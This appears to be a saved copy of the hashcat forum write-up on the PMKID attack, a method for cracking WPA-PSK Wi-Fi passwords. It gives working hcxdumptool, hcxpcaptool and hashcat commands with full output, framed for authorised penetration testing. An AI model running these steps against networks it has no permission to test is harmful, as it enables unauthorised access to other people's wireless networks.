https://hashcat.net/forum/thread-7717.html
https://www.bleepingcomputer.com/news/security/researcher-cracked-70-percent-of-wifi-networks-sampled-in-tel-aviv/


# PMKID attack

`In this writeup, I'll describe a new technique to crack WPA PSK (Pre-Shared Key) passwords.  
  
In order to make use of this new attack you need the following tools: ` 

-   [hcxdumptool v4.2.0 or higher](https://github.com/ZerBea/hcxdumptool)  
    
-   [hcxtools v4.2.0 or higher](https://github.com/ZerBea/hcxtools)  
    
-   [hashcat v4.2.0 or higher](https://github.com/hashcat/hashcat)  
    

  
This attack was discovered accidentally while looking for new ways to attack the new WPA3 security standard. WPA3 will be much harder to attack because of its modern key establishment protocol called "Simultaneous Authentication of Equals" (SAE).  
  
The main difference from existing attacks is that in this attack, capture of a full EAPOL 4-way handshake is not required. The new attack is performed on the RSN IE (Robust Security Network Information Element) of a single EAPOL frame.  
  
At this time, we do not know for which vendors or for how many routers this technique will work, but we think it will work against all 802.11i/p/q/r networks with roaming functions enabled (most modern routers).  
  
The main advantages of this attack are as follow:  

-   No more regular users required - because the attacker directly communicates with the AP (aka "client-less" attack)  
    
-   No more waiting for a complete 4-way handshake between the regular user and the AP  
    
-   No more eventual retransmissions of EAPOL frames (which can lead to uncrackable results)  
    
-   No more eventual invalid passwords sent by the regular user  
    
-   No more lost EAPOL frames when the regular user or the AP is too far away from the attacker  
    
-   No more fixing of nonce and replaycounter values required (resulting in slightly higher speeds)  
    
-   No more special output format (pcap, hccapx, etc.) - final data will appear as regular hex encoded string  
    

  

---

  
Attack details:  
  
The RSN IE is an optional field that can be found in 802.11 management frames. One of the RSN capabilities is the PMKID.  
  
![[Pasted image 20211027125225.png]]
  
The PMKID is computed by using HMAC-SHA1 where the key is the PMK and the data part is the concatenation of a fixed string label "PMK Name", the access point's MAC address and the station's MAC address.  
  

Code:

`PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)`

  
Since the PMK is the same as in a regular EAPOL 4-way handshake this is an ideal attacking vector.  
  
We receive all the data we need in the first EAPOL frame from the AP.  
  

---

  
How to reproduce:  
  
1. Run hcxdumptool to request the PMKID from the AP and to dump the recieved frame to a file (in pcapng format).  
  

Code:

`$ ./hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 --enable_status`

  
Output:  
  

![[Pasted image 20211027125353.png]]
  
If an AP recieves our association request packet and supports sending PMKID we will see a message "FOUND PMKID" after a moment:  
  

> Quote:[13:29:57 - 011] 89acf0e761f4 -> 4604ba734d4e <ESSID> [ASSOCIATIONREQUEST, SEQUENCE 4]  
> [13:29:57 - 011] 4604ba734d4e -> 89acf0e761f4 [ASSOCIATIONRESPONSE, SEQUENCE 1206]  
> [13:29:57 - 011] 4604ba734d4e -> 89acf0e761f4 [FOUND PMKID]

  
Note: Based on the noise on the wifi channel it can take some time to recieve the PMKID. We recommend running hcxdumptool up to 10 minutes before aborting.  
  
2. Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat.  
  

Code:

`$ ./hcxpcaptool -z test.16800 test.pcapng`

  
Output:  
  

> Quote:start reading from test.pcapng  
>   
> summary:  
> --------  
> file name....................: test.pcapng  
> file type....................: pcapng 1.0  
> file hardware information....: x86_64  
> file os information..........: Linux 4.17.11-arch1  
> file application information.: hcxdumptool 4.2.0  
> network type.................: DLT_IEEE802_11_RADIO (127)  
> endianess....................: little endian  
> read errors..................: flawless  
> packets inside...............: 66  
> skipped packets..............: 0  
> packets with FCS.............: 0  
> beacons (with ESSID inside)..: 17  
> probe requests...............: 1  
> probe responses..............: 11  
> association requests.........: 5  
> association responses........: 5  
> authentications (OPEN SYSTEM): 13  
> authentications (BROADCOM)...: 1  
> EAPOL packets................: 14  
> EAPOL PMKIDs.................: 1  
>   
> 1 PMKID(s) written to test.16800

  
The content of the written file will look like this:  
  

> Quote:2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a

  
The columns are the following (all hex encoded):  

-   PMKID  
    
-   MAC AP  
    
-   MAC Station  
    
-   ESSID  
    

  
Note: While not required it is recommended to use options -E -I and -U with hcxpcaptool. We can use these files to feed hashcat. They typically produce good results.  

-   -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)  
    
-   -I retrieve identities from WiFi-traffic  
    
-   -U retrieve usernames from WiFi-traffic  
    

  

Code:

`$ ./hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng`

  
3. Run hashcat to crack it.  
  
Basically we can attack this hash as any other hash type. The hash-mode that we need to use is 16800.  
  

Code:

`$ ./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'`

  
Output:  
  

> Quote:hashcat (v4.2.0) starting...  
>   
> OpenCL Platform #1: NVIDIA Corporation  
> ======================================  
> * Device #1: GeForce GTX 1080, 2028/8112 MB allocatable, 20MCU  
> * Device #2: GeForce GTX 1080, 2029/8119 MB allocatable, 20MCU  
> * Device #3: GeForce GTX 1080, 2029/8119 MB allocatable, 20MCU  
> * Device #4: GeForce GTX 1080, 2029/8119 MB allocatable, 20MCU  
>   
> Hashes: 1 digests; 1 unique digests, 1 unique salts  
> Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
>   
> Applicable optimizers:  
> * Zero-Byte  
> * Single-Hash  
> * Single-Salt  
> * Brute-Force  
> * Slow-Hash-SIMD-LOOP  
>   
> Minimum password length supported by kernel: 8  
> Maximum password length supported by kernel: 63  
>   
> Watchdog: Temperature abort trigger set to 90c  
>   
> 2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a:hashcat!  
>   
> Session..........: hashcat  
> Status...........: Cracked  
> Hash.Type........: WPA-PMKID-PBKDF2  
> Hash.Target......: 2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf...a39f3a  
> Time.Started.....: Thu Jul 26 12:51:38 2018 (41 secs)  
> Time.Estimated...: Thu Jul 26 12:52:19 2018 (0 secs)  
> Guess.Mask.......: ?l?l?l?l?l?lt! [8]  
> Guess.Queue......: 1/1 (100.00%)  
> Speed.Dev.#1.....:   408.9 kH/s (103.86ms) @ Accel:64 Loops:128 Thr:1024 Vec:1  
> Speed.Dev.#2.....:   408.6 kH/s (104.90ms) @ Accel:64 Loops:128 Thr:1024 Vec:1  
> Speed.Dev.#3.....:   412.9 kH/s (102.50ms) @ Accel:64 Loops:128 Thr:1024 Vec:1  
> Speed.Dev.#4.....:   410.9 kH/s (104.66ms) @ Accel:64 Loops:128 Thr:1024 Vec:1  
> Speed.Dev.#*.....:  1641.3 kH/s  
> Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts  
> Progress.........: 66846720/308915776 (21.64%)  
> Rejected.........: 0/66846720 (0.00%)  
> Restore.Point....: 0/11881376 (0.00%)  
> Candidates.#1....: hariert! -> hhzkzet!  
> Candidates.#2....: hdtivst! -> hzxkbnt!  
> Candidates.#3....: gnxpwet! -> gwqivst!  
> Candidates.#4....: gxhcddt! -> grjmrut!  
> HWMon.Dev.#1.....: Temp: 81c Fan: 54% Util: 75% Core:1771MHz Mem:4513MHz Bus:1  
> HWMon.Dev.#2.....: Temp: 81c Fan: 54% Util:100% Core:1607MHz Mem:4513MHz Bus:1  
> HWMon.Dev.#3.....: Temp: 81c Fan: 54% Util: 94% Core:1683MHz Mem:4513MHz Bus:1  
> HWMon.Dev.#4.....: Temp: 81c Fan: 54% Util: 93% Core:1620MHz Mem:4513MHz Bus:1  
>   
> Started: Thu Jul 26 12:51:30 2018  
> Stopped: Thu Jul 26 12:52:21 2018

  
There's also support for hash-mode 16801, which allows skipping the computation of the PMK - which is the computation that makes cracking WPA so slow. Pre-computing PMK can be useful in cases where you are on site and you cannot transfer a hash to a remote cracking rig because of an NDA. The goal is to run hashcat on your notebook which you can bring to the site.  
  
The mode 16801 expects a list of pre-computed PMKs, as hex encoded strings of length 64, as the input wordlist. To pre-compute the PMKs you can use the hcxkeys tool. The hcxkeys tools require the ESSID, so you need to ask for the ESSID from your client in advance.